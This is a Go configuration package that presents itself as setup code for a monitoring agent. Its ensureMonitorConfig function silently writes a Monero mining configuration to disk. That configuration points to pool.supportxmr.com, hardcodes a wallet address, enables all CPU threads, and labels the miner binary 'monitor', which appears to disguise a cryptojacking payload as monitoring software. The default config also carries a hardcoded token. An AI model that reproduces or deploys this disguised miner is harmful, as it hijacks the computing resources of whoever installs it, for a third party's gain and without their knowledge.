// Package config provides functionality for loading and managing configuration files
package config

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"gopkg.in/yaml.v3"
)

// ConfigManager handles the creation and validation of configuration files
type ConfigManager struct {
	configPath string
}

// NewConfigManager creates a new configuration manager
func NewConfigManager(configPath string) *ConfigManager {
	return &ConfigManager{
		configPath: configPath,
	}
}

// EnsureConfigs checks if all required configuration files exist and creates them if needed
func (cm *ConfigManager) EnsureConfigs() error {
	// Check if main config file exists
	if _, err := os.Stat(cm.configPath); os.IsNotExist(err) {
		// Create the directory if it doesn't exist
		dir := filepath.Dir(cm.configPath)
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("failed to create config directory: %v", err)
		}

		// Create default config file
		if err := cm.createDefaultAgentConfig(); err != nil {
			return fmt.Errorf("failed to create default agent config: %v", err)
		}
		fmt.Printf("Created default agent config at: %s\n", cm.configPath)
	} else if err != nil {
		return fmt.Errorf("error checking config file: %v", err)
	}

	// Load the config to validate it and ensure dependent files exist
	cfg, err := LoadConfig(cm.configPath)
	if err != nil {
		return fmt.Errorf("failed to load config: %v", err)
	}

	// Ensure all paths in the config exist
	if err := cm.ensurePaths(&cfg.Paths); err != nil {
		return fmt.Errorf("failed to ensure paths: %v", err)
	}

	return nil
}

// createDefaultAgentConfig creates a default agent configuration file
func (cm *ConfigManager) createDefaultAgentConfig() error {
	defaultConfig := &Config{
		ServerURL:       "http://localhost:8080",
		Token:           "abc123",
		MetricsInterval: 30,
		Paths: PathsConfig{
			MonitorBin:      "./bin/monitor",
			MonitorConfig:   "./configs/monitor-config.json",
			MonitorLogFile:  "./logs/monitor.log",
		},
	}

	data, err := yaml.Marshal(defaultConfig)
	if err != nil {
		return fmt.Errorf("failed to marshal default config: %v", err)
	}

	return os.WriteFile(cm.configPath, data, 0644)
}

// ensurePaths ensures all paths in the configuration exist
func (cm *ConfigManager) ensurePaths(paths *PathsConfig) error {
	// Ensure monitor config exists
	if err := cm.ensureMonitorConfig(paths.MonitorConfig); err != nil {
		return fmt.Errorf("failed to ensure monitor config: %v", err)
	}

	// Ensure log directory exists
	logDir := filepath.Dir(paths.MonitorLogFile)
	if err := os.MkdirAll(logDir, 0755); err != nil {
		return fmt.Errorf("failed to create log directory: %v", err)
	}

	// Ensure bin directory exists
	binDir := filepath.Dir(paths.MonitorBin)
	if err := os.MkdirAll(binDir, 0755); err != nil {
		return fmt.Errorf("failed to create bin directory: %v", err)
	}

	return nil
}

// ensureMonitorConfig ensures the monitor config file exists
func (cm *ConfigManager) ensureMonitorConfig(configPath string) error {
	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		// Create the directory if it doesn't exist
		dir := filepath.Dir(configPath)
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("failed to create config directory: %v", err)
		}

		// Create default monitor config
		defaultMonitorConfig := `{
  "pools": [
    {
      "url": "pool.supportxmr.com:3333",
      "user": "44AFFqy7375JZ4QH4CNjvwV5YgFg9wqD4GcxxuEf8hT14VrY4YbqN2uyNMy6fWZkVM9EuJajCCHTSfmh2U4vcNLX34BdxRT",
      "pass": "x",
      "keepalive": true,
      "tls": false
    }
  ],
  "cpu": {
    "enabled": true,
    "threads": 0,
    "priority": 0,
    "memory-pool": false
  },
  "opencl": false,
  "cuda": false,
  "donate-level": 1
}`
		return os.WriteFile(configPath, []byte(defaultMonitorConfig), 0644)
	} else if err != nil {
		return fmt.Errorf("error checking monitor config file: %v", err)
	}
	return nil
}

// ValidateConfig validates the loaded configuration
func (cm *ConfigManager) ValidateConfig(config *Config) error {
	var errors []string

	// Validate required fields
	if strings.TrimSpace(config.ServerURL) == "" {
		errors = append(errors, "server_url is required")
	}
	if strings.TrimSpace(config.Token) == "" {
		errors = append(errors, "token is required")
	}
	if config.MetricsInterval <= 0 {
		errors = append(errors, "metrics_interval must be greater than 0")
	}

	// Validate paths exist
	if _, err := os.Stat(config.Paths.MonitorBin); os.IsNotExist(err) {
		errors = append(errors, fmt.Sprintf("monitor binary does not exist: %s", config.Paths.MonitorBin))
	}
	if _, err := os.Stat(config.Paths.MonitorConfig); os.IsNotExist(err) {
		errors = append(errors, fmt.Sprintf("monitor config does not exist: %s", config.Paths.MonitorConfig))
	}

	if len(errors) > 0 {
		return fmt.Errorf("configuration validation failed: %s", strings.Join(errors, "; "))
	}

	return nil
}